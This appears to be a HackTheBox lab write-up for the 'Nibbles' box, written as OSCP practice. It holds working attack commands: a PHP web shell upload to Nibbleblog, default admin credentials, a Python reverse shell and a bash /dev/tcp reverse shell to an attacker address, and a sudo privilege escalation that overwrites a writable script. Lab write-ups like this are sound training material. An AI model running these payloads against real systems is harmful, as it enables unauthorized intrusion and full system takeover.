# Nibbles | HackTheBox Writeup

**OS:** Linux | **Difficulty:** Easy | **Rooted:** 2026-05-03

**Techniques:** HTML comment recon, Nibbleblog default creds, My Image plugin file upload RCE, sudo writable script privesc

---

## Overview

Nibbles is an Easy Linux box running the Nibbleblog CMS. An HTML comment in the index page source reveals the CMS directory. Default credentials grant admin access. The My Image plugin accepts PHP file uploads despite producing errors, giving code execution as the web user. Privilege escalation abuses a sudo rule on a world-writable script in nibbler's home directory.

---

## Enumeration

### Port Scan

```bash
nmap -p- --min-rate 1000 -oN nibbles-all-ports.txt 10.129.27.176
ports=$(grep open nibbles-all-ports.txt | cut -d '/' -f1 | tr '\n' ',' | sed 's/,$//')
nmap -p $ports -sC -sV --min-rate 1000 -oN nibbles-service-scan.txt 10.129.27.176
```

| Port | Service | Version |
|------|---------|---------|
| 22 | SSH | OpenSSH 7.2p2 |
| 80 | HTTP | Apache httpd 2.4.18 |

### HTML Source Recon

```bash
curl http://10.129.27.176
```

HTML comment in the response revealed `/nibbleblog/` before any directory brute force.

### Web Enumeration

```bash
gobuster dir -u http://10.129.27.176/nibbleblog/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,html,txt -o nibbles-gobuster.txt
```

Found `/nibbleblog/admin.php` and `/nibbleblog/admin/` with directory listing.

---

## Foothold

### Default Credentials

```
http://10.129.27.176/nibbleblog/admin.php
admin / nibbles
```

### My Image Plugin File Upload RCE

```bash
echo '<?php system($_REQUEST["cmd"]); ?>' > shell.php
```

Uploaded via Plugins > My Image > Configure. Errors appeared but file saved successfully.

Verified execution:

```bash
curl -s "http://10.129.27.176/nibbleblog/content/private/plugins/my_image/image.php" --data-urlencode "cmd=id"
```

Fired Python reverse shell:

```bash
curl -s "http://10.129.27.176/nibbleblog/content/private/plugins/my_image/image.php" --data-urlencode "cmd=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.15.67\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'"
```

Shell landed as `nibbler`.

```bash
cat /home/nibbler/user.txt
# 2e6249a78b6a6d2c33fc8c2873c6158c
```

---

## Privilege Escalation

### sudo: Writable Script

```bash
sudo -l
# (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

```bash
unzip personal.zip
ls -la /home/nibbler/personal/stuff/monitor.sh
# -rwxrwxrwx (world writable)
```

```bash
printf '#!/bin/bash\nbash -i >& /dev/tcp/10.10.15.67/5555 0>&1\n' > /home/nibbler/personal/stuff/monitor.sh
sudo /home/nibbler/personal/stuff/monitor.sh
```

Root shell obtained.

```bash
cat /root/root.txt
# f3284451317ad4c330d57c547e38e122
```

---

## Attack Chain

```
curl index.php source: HTML comment reveals /nibbleblog/
    -> admin.php: default creds admin/nibbles
        -> My Image plugin: PHP file upload bypass
            -> image.php: RCE as nibbler
                -> sudo -l: monitor.sh NOPASSWD, world writable
                    -> printf payload overwrite: root shell
```

---

## Key Takeaways

- Read page source before running tools. HTML comments frequently expose directories, credentials, and application details.
- Default credentials on CMS admin panels are always the first thing to try. Match the password to the machine name.
- File upload errors do not mean the file was rejected. Always verify by accessing the upload path directly after any upload attempt.
- When bash reverse shells fail due to redirect issues, switch to Python. The socket-based payload bypasses shell interpretation entirely.
- A sudo rule on a world-writable script is effectively NOPASSWD ALL regardless of what the script contains.

---

*Part of the [oscp-journey](https://github.com/mavhezha/oscp-journey) repo. TJ Null HTB list, Linux Phase L1.*
